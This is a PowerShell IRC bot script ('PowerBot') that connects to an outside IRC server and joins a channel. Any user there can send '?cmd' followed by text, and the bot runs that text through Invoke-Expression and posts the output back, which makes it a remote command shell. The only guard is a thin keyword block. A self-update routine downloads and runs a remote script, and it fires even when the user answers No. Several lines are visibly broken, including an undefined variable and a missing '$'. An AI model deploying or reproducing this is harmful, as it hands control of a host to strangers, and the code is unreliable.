$channel = "#occutest"
$gwriter = ""
$version = "0.3"
$onlineversion = "https://raw.githubusercontent.com/occupi2011/powerbot/master/version.txt"

Function Get-Updates() 
{
    $updatesavailable = $false
    $newversion = $null

    try {
        $newversion = (New-Object System.Net.WebClient).DownloadString($onlineversion).Trim([Environment]::NewLine)
        Write-Host $newversion
    }
    catch {
        Write-Host $_
    }

    if ($null -ne $newversion -and $version -ne $newversion)
    {
        $updatesavailable = $false
        $current = $version.Split(".")
        $new = $newversion.Split(".")
        for($i=0; $i -le ($current.Count -1); $i++)
        {
            if([int]$new[$i] -gt [int]$current[$i])
            {
                $updatesavailable = $true
                break
            }
        }
    }
    return $updatesavailable
}

Function Install-Updates () {
    $updatepath = "$($PWD.Path)\powerbot_updated.ps1"

    if(Test-Path -Path $updatepath)
    {
        Remove-Item $updatepath
    }

    if(Get-Updates)
    {
        Write-Host "Update available! Would you like to update PowerBot?"
        $response = Read-Host "`n[Y]es or [N]o?"
        while (($response -match "[YyNn]") -eq $false)
        {
            $response = Read-Host "Simply Y or N please."
        }

        if ($response -match "[YyNn]")
        {
            (New-Object System.Net.WebClient).DownloadFile($updatefile, $updatepath)
            Start-Process PowerShell -Arg $updatepath
            exit
        }
    }
}

Function Send-ChannelMsg (
    [Parameter(Mandatory=$True)][string]$Channel, 
    [Parameter(Mandatory=$True)][string]$Message) 
{

    $Message.Split([Environment]::NewLine) | ForEach {
        $gwriter.WriteLine("PRIVMSG $Channel $_")
        $gwriter.Flush()
        Write-Host "--> <$Channel> $_"
        }

}

Function Send-IRCPong (
    [Parameter(Mandatory=$True)][string]$Ping) 
{
    $gwriter.WriteLine($Ping.Replace("PING","PONG"))
    Write-Host "-->",$Ping.Replace("PING","PONG")
    $gwriter.Flush()
}

Function Join-IRCChannel (
    [Parameter(Mandatory=$True)][string]$Channel)
{
    $gwriter.WriteLine([string]("JOIN",$Channel))
    $gwriter.Flush()
    Write-Host "[+] Joining",$Channel
}

Function Connect-IRCServer ( 
    [Parameter(Mandatory=$True)][String]$Hostname, 
    [Parameter(Mandatory=$True)][UInt16]$Port)
{
    
    Try
    {
        $ErrorActionPreference = "Stop"
        $TCPClient  = New-Object System.Net.Sockets.TcpClient
        $IPEndpoint = New-Object System.Net.IPEndPoint($([Net.Dns]::GetHostEntry($Hostname)).AddressList[0], $Port)
        $TCPClient.Connect($IPEndpoint)
        $stream  = $TCPClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $gwriter = $writer
        $buffer = New-Object System.Byte[] 1024
        $encoding = New-Object System.Text.ASCIIEncoding
        
        Write-Host "[+] Created Socket Client..."
        if($TCPClient.Connected) { Write-Host "[+] Connected to server" }
        
        $writer.WriteLine("USER powershell 8 x :powerbot")
        $writer.Flush()
        $writer.WriteLine("NICK PowerBot")
        $writer.Flush()
       
        while($True) {
            start-sleep -m 1000
            while($stream.DataAvailable) {
                $read = $stream.Read($buffer, 0, 1024)
                Write-Host -n ($encoding.GetString($buffer, 0, $read))
                $text_stream = $encoding.GetString($buffer, 0, $read)
                If ($text_stream.StartsWith("PING")) {
                    Send-IRCPong -Ping $text_stream
                    }
                If ($text_stream.Contains("MODE PowerBot :+iwx")) {
                    Join-IRCChannel -Channel $channel
                    }
                
                $m = $text_stream -match '^[:](?<user>[\w]*)[!]([\w]*[@][\w.]*)[ ]PRIVMSG[ ]([+#\w]*)[ ][:][?](?<command>[\w\W]*)$'
                if($m) {
                    if ($Matches.Count -gt 0) {
                        $command,$args = $Matches.command -split " "
                        $user = $Matches.user

                        if($command.Contains("test")) {
                                    Write-Host "Matched an actual command"
                                    Send-ChannelMsg -Channel $channel -Message "$user`: Regex match."
                                }
                        if($command.Contains("quit")) {
                                    return
                                }
                        if($command.Contains("reload")) {
                            CurrentScriptPath = $MyInvocation.ScriptName
                            &$CurrentScriptPath
                            exit
                        }
                        if($command.Contains("cmd")) {
                                    if(!$args) {
                                        Send-ChannelMsg -Channel $channel -Message "No powershell command specified."
                                        break
                                        }
                                    if($args.Contains("invoke-expression") -or $args.Contains("iex") -or $args.Contains("exit")) {
                                        Send-ChannelMsg -Channel $channel -Message "No."
                                        break
                                    }
                                    Write-Host "executing: $args"
                                    Try {
                                    $r = Invoke-Expression "$args" | Out-String -Stream
                                    }
                                    Catch {
                                    $ErrorMessage = $_.Exception.Message
                                    $FailedItem = $_.Exception.ItemName
                                    Send-ChannelMsg -Channel $channel -Message "$ErrorMessage, $FailedItem"
                                    break
                                    }
                                    IF([string]::IsNullOrEmpty($r)) {            
                                        $r = "No printable string returned."
                                    }
                                    Write-Host $r
                                    Send-ChannelMsg -Channel $channel -Message "$r"
                                    }
                            }
                        }
                }
            }
    }
    Finally
    {
        If ($NetStream) { $NetStream.Dispose() }
        If ($TCPClient) { $TCPClient.Dispose() }
        If ($writer) { $writer.Dispose() }
    }
}

Install-Updates
Write-Host "Connecting to IRC server..."
Connect-IRCServer -Hostname irc.0x00sec.org -Port 6667